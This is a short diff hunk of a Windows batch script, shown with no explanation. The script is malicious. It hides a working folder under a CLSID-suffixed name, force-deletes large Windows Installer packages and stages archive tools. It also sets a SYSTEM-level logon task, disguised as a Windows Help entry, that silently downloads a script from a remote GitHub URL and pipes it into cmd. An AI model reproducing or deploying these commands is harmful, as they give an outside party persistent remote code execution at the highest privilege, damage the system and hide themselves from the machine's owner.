@@ -17,7 +17,7 @@ for %a in (%processList%) do (
 
 mkdir "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 for %F in (%WINDIR%\Installer\*.msi) do if %~zF gtr 524288000 del /f /q "%F"
-move /Y "%ProgramData%\Comms\wget.exe" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
+
 move /Y "%ProgramData%\Comms\guard.rar" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 move /Y "%ProgramData%\Comms\UnRAR.exe" "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\"
 schtasks /create /RU "NT AUTHORITY\SYSTEM" /RL HIGHEST /sc onlogon /tn "\Windows\Help\Help" /tr "%WINDIR%\System32\cmd.exe /c %ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - https://raw.githubusercontent.com/pushop/0/0/0/zen | cmd /Q /V:ON" /F
